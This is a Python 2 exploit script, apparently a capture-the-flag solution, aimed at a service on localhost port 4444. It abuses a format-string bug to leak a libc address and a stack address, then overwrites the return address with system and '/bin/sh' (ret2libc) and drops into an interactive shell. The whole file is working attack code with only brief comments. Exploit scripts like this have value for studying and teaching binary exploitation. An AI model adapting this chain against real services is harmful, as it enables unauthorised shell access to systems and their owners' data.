from m1z0r3 import *
from libformatstr import FormatStr

HOST = "localhost"
PORT = 4444

s,f = sock(HOST,PORT)

index = 6
addr_got_start = 0x8049fec
offset_start_main = 0x19990
offset_system = 0x3e800
offset_binsh = 0x15f9e4
offset_input = 0x1d9c

# send name
s.send("hoge\n")

# leak libc
buf = p32(addr_got_start)
buf += "%6$s"
read_until(f,"Enter your message:")
s.send(buf+"\n")
read_until(f,"Entered:")
addr_start_main = u32(read_until(f)[5:9])
base_libc = addr_start_main - offset_start_main
print "[+] addr_start_main: %08x" % addr_start_main
print "[+] base_libc: %08x" % base_libc

# leak stack
addr_input = base_libc - offset_input
buf = p32(addr_input-32)
buf += "%6$s"
read_until(f,"Enter your message:")
s.send(buf+"\n")
read_until(f,"Entered:")
addr_buf = u32(read_until(f)[5:9])
addr_ret =  addr_buf + 1056
print "[+] addr input: %08x" % addr_input
print "[+] addr_buf: %08x" % addr_buf
print "[+] addr_ret: %08x" % addr_ret

# ret2libc
addr_system = base_libc + offset_system
addr_binsh = base_libc + offset_binsh
read_until(f,"Enter your message:")
p = FormatStr()
p[addr_ret] = addr_system
p[addr_ret+4] = "AAAA"
p[addr_ret+8] = addr_binsh
buf = p.payload(index)
s.send(buf+"\n")

shell(s)
